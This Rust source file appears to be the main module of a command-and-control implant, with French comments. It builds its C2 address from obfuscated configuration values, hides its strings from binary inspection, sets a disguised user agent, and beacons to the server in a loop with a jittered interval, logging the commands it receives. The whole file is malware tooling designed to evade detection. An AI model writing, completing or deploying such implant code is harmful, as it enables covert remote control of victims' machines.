mod api_hash;
mod config;

use obfstr::obfstr;
use rand::Rng;
use reqwest::Client;
use shared::{BeaconPing, BeaconPong};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

fn now_ts() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

/// Jitter 0–4000 ms → intervalle final = 5s ± 2s
fn jitter_ms() -> u64 {
    rand::thread_rng().gen_range(0..4_000)
}

#[tokio::main]
async fn main() {
    // Toutes les chaînes obfusquées — aucun plaintext dans le binaire
    let c2_url = format!(
        "{}://{}:{}{}",
        config::c2_scheme(),
        config::c2_host(),
        config::c2_port(),
        config::c2_ping_path(),
    );

    let client = Client::builder()
        .user_agent(config::user_agent())
        .timeout(Duration::from_secs(10))
        .build()
        .expect(obfstr!("HTTP client build failed"));

    println!("[*] {} started — C2: {}", obfstr!("Implant"), c2_url);

    let mut beacon_id: u64 = 0;

    loop {
        beacon_id += 1;

        let ping = BeaconPing {
            id: beacon_id,
            ts: now_ts(),
        };

        match client.post(&c2_url).json(&ping).send().await {
            Ok(resp) => match resp.json::<BeaconPong>().await {
                Ok(pong) => println!("[+] Pong #{} — cmd: {:?}", pong.id, pong.cmd),
                Err(e)   => eprintln!("[-] JSON parse: {}", e),
            },
            Err(e) => eprintln!("[-] Beacon #{} failed: {}", beacon_id, e),
        }

        let sleep_ms = config::beacon_interval_ms() + jitter_ms();
        tokio::time::sleep(Duration::from_millis(sleep_ms)).await;
    }
}
